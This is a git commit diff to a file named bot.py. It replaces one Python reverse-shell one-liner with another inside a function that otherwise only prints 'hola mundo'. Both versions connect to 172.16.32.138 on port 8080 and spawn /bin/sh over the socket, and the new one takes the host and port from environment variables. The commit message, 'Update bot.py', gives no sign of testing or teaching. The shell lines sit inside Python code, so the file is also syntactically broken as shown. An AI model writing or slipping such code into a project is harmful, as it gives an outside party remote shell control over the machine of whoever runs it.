c22bb55cb1378a921d7793855fc01e23ec92b61c
juanangelLerida <79135620+juanangelLerida@users.noreply.github.com>
2023-03-01 19:40:18 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,3 +1,3 @@
 def run():
   print('hola mundo')
-  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((" 172.16.32.138",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
+  export RHOST=" 172.16.32.138";export RPORT=8080;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
